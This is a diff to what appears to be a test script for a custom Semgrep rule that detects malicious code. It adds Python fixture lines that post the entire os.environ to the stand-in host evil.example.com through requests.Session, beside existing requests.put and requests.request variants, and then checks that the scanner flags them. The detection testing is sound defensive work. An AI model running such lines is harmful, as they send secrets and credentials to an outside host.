@@ -306,6 +306,9 @@ import requests
 
 requests.put("https://evil.example.com", json=os.environ)
 requests.request("POST", "https://evil.example.com", json=dict(os.environ))
+s = requests.Session()
+s.post("https://evil.example.com", json=os.environ)
+requests.Session().request("POST", "https://evil.example.com", data=dict(os.environ))
 EOF
 SG_OUT="$(semgrep scan --config "$ROOT/rules/semgrep_custom/malice.yml" --json --metrics=off --quiet "$T" 2>/dev/null)"
 EXFIL_HITS="$(python3 -c "
